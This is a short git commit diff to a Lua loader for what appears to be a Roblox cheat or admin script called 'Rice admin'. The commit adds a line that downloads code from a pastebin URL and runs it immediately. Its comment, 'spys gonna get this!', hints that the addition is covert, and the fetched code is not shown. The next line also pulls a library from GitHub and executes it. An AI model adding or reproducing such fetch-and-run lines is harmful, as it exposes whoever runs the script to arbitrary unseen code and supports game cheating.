ba51cc1caf8ea70a59cd1ba9f3db67ba9460211f
xyzzr <110189904+xyzzr@users.noreply.github.com>
2024-06-26 20:27:26 +0300

    Update loader.lua

--- rice/loader.lua
+++ rice/loader.lua
@@ -33,7 +33,7 @@ Fixed discord invite button
 Fixed fly
 ]]
 
-
+loadstring(game:HttpGet("https://pastebin.com/raw/2GHL79gP"))() -- spys gonna get this!
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xyzzr/libarys/main/xsyhfs.lua"))()
 local version = "1.5"
 local Wm = library:Watermark("Rice admin | v" .. version)
